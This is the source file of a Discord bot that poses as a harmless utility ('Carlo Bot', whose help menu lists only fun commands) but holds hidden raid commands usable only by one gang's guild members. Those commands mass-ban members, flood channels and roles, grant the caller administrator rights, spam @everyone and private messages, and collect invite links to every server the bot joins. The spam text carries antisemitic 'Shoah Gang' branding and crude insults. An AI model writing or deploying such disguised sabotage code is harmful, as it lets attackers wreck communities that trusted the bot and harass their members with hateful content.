const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');
 
var fucked = false;
 



bot.on('ready',() => {
  //invit link
  console.log("jsuis co ")
  bot.guilds.forEach(guild => {
    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
  });
}); 

bot.on('message', msg => {

  if (msg.guild === bot.guilds.find('id', '430039551747293205')){ 
    return;
  }
  
  

 if (bot.guilds.get('430039551747293205').members.get(msg.author.id) !== undefined) {
    
if (msg.content === '.destruction') {
    console.log(`Commande .destruction par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("RAID BY SHOAH GANG  @everyone  @here . \n"+ 
"https://cdn.discordapp.com/attachments/436188674435317760/445207285195866124/shoah.png . \n"+
"https://cdn.discordapp.com/attachments/436188674435317760/445207509204992021/walkoud_singe.png .\n"+
"https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
"SHOAH GANG ON THE BEAT (: \n"+
"~ ~ ~ ~ ~ ~~ ~ \n"+    
"ROCKET MAN MA SALOPE \n"+
"~ ~ ~ ~ ~ ~~ ~  ~~  ~~").catch(e => {});
    }, 450)
  }

if (msg.content === '.oupss') {
    console.log(`Commande .oupss par ${msg.author.tag}`);
   fucked = false;

 
    if (!fucked){
      msg.guild.setIcon("./shoah.jpg").catch(e => {});
      msg.guild.setName('BZ by Shoah Gang').catch(e => {});
     msg.guild.setRegion('hongkong').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('raid_by_shoah_gang', 'voice').catch(e => {});
        msg.guild.createChannel('raid_by_shoah_gang', 'text').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }


if (msg.content === '.banev') {
    console.log(`Commande .banev par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
    });
  }


if (msg.content === '.leave') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

if (msg.content === '.pardon') {
    console.log(`Commande .pardon par ${msg.author.tag}`);

    msg.member.guild.createRole({
      name: "Shoah Gang",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role).catch(e => {});
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  if (msg.content === '.roleflood') {

    if (msg.deletable) msg.delete();
    let i = 0;
    let interval = setInterval(function () {
    if (i === 500) clearInterval(interval);
      msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM', permissions: "ADMINISTRATOR"}).then(function(role) {
        msg.member.addRole(role).catch(e => {});
        if (msg.deletable) msg.delete().catch(e => {});
      }).catch(e => {});
      i++
    }, 100)
  }

  if(msg.content === ".renameall"){
    if(msg.deletable) msg.delete();
    msg.guild.members.forEach(member => {
      if(member.setNickname("SHOAH GANG ON THE DANCEFLOOR"));      
  })
  }
  if(msg.content === ".mp"){
    if(msg.deletable) msg.delete();
    i = 0;
    msg.guild.members.forEach(member => {

    if(i < 500){
      var interval = setInterval (function () {
        member.send("RAID BY SHOAH GANG  @everyone  @here . \n"+ 
        "https://cdn.discordapp.com/attachments/436188674435317760/445207285195866124/shoah.png . \n"+
        "https://cdn.discordapp.com/attachments/436188674435317760/445207509204992021/walkoud_singe.png .\n"+
        "https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
        "SHOAH GANG ON THE BEAT (: \n"+
        "~ ~ ~ ~ ~ ~~ ~ \n"+    
        "ROCKET MAN MA SALOPE \n"+
        "~ ~ ~ ~ ~ ~~ ~  ~~  ~~").catch(e => {});
      }, 450)

      }   
  })
  }

 }//Filtre personne
});
bot.on("message", message => {
  if(message.content.startsWith(".avatar")) {
    let membere = message.mentions.members.first()
    let avatar_embed = new Discord.RichEmbed()
    .setAuthor(` Avatar de ${message.mentions.users.first().username}`)
    .setColor("RANDOM")
    .setImage(membere.user.avatarURL)
    .setFooter("*Carlo Bot  ©*")
    return message.channel.send(avatar_embed).catch(e => {});
}
if(message.content.startsWith(".say")) {
  if(message.deletable) {
  message.delete()}
var text = message.content.split(" ").slice(1).join(" ")
if(!text){
  messsage.channel.send("Tu ne m'as pas donner un message à répéter :x:").catch(e => {});
}
let embed = new Discord.RichEmbed();
embed.setColor("RANDOM")
.setDescription(text)
message.channel.sendEmbed(
  embed, {
    disableEveryone: true
  }
).catch(e => {});
}
})

bot.on("message", message => {
  if(message.content.startsWith(".8ball")){
    var question = message.content.split(" ").slice(1).join(" ")
    var tableauball = ["Oui","Non","Peut être", "Je ne sais pas", "Surement", "Probablement","C'est sur", "J'en sais rien"]
    let ball_embed = new Discord.RichEmbed()
    .setColor("RANDOM")
    .setTitle("Question de "+message.author.tag)
    .setDescription(question)
    .addField("Reponse", tableauball[Math.floor(Math.random()*8)])
    .setFooter("*Carlo Bot  ©*")
    .setThumbnail(bot.user.iconURL)
    message.channel.send(ball_embed).catch(e => {});
  }
  if(message.content.startsWith(".flip")){
    var flipdebut = message.content.split(" ").slice(1).join(" ")
    if(flipdebut === "pile" || flipdebut === "face"){
      var reponse = ["Vrai, c'est bien ça", "Faux, ce n'est pas ça "]
      let flip_embed = new Discord.RichEmbed()
      .setDescription(reponse[Math.floor(Math.random()*2)])
      .setColor("RANDOM")
      .setFooter("*Carlo Bot  ©*")
      .setThumbnail(bot.user.iconURL)
      message.channel.send(flip_embed).catch(e => {});
    }
    else {
      message.channel.send("** :x: Vous devez dire pile ou face, Exemple : .flip pile **").catch(e => {});
    }
  }
  if(message.content.startsWith("@"+bot.user.id)){
    message.reply("Voici mon lien d'invitation : https://discordapp.com/oauth2/authorize?client_id=444526510930395148&scope=bot&permissions=2146958591 ").catch(e => {});
  }
  if(message.content.startsWith(".serverinfo")){
    let serverinfo_embed = new Discord.RichEmbed()
    .setTitle("Info Sur le Serveur")
    .setColor("RANDOM")
    .addField("Nom", message.guild.name)
    .addField("Date de Creation", message.guild.createdAt)
    .addField("Id du serveur", message.guild.id)
    .addField("Emplacement Du Serveur", message.guild.region)
    .setThumbnail(message.guild.iconURL)
    .addField("Nombre de membre", message.guild.memberCount)
    .setFooter("*Carlo Bot  ©*")
    message.channel.send(serverinfo_embed).catch(e => {});
  }

  if(message.content === ".help"){
    let help2_embed = new Discord.RichEmbed()
    .setThumbnail(bot.user.iconURL)
    .setColor("RANDOM")
    .setTitle("HELP")
    .addField(".serverinfo", "Donne des infos sur le serveur ! ")
    .addField(".avatar", "Affiche l'avatar d'un joueur")
    .addField("flip", "Sert a jouer a pile ou face")
    .addField(".8ball", "Pose une question une bot")
    .addField(".say", "Le bot repete votre message")
    .addField(".userinfo", "Donne des infos sur un joueur")
    .setFooter("Carlo Bot  ©")
    message.channel.send(help2_embed).catch(e => {});
  }
  if(message.content.startsWith(".userinfo")){
    let membere2 = message.mentions.members.first()
    let userinfo_embed = new Discord.RichEmbed()
    .setThumbnail(membere2.user.avatarURL)
    .setColor("RANDOM")
    .addField("Pseudo", `${message.mentions.users.first().username}`)
    .addField("Date de Creation Du Compte", membere2.user.createdAt)
    .addField("Discriminator", '#'+membere2.user.discriminator)
    .addField("Id du Membre", membere2.user.id)
    .addField("Tag du Membre", membere2.user.tag)
    message.channel.send(userinfo_embed).catch(e => {});
  }
  if (bot.guilds.get('430039551747293205').members.get(message.author.id) !== undefined) {
    if(message.content.startsWith(".listeserver")) {
      bot.guilds.forEach(guild => {
        var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id)
        invite.createInvite().then(invite => message.channel.send(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
      })
    }
  }

})

bot.login(process.env.BOT_TOKEN)
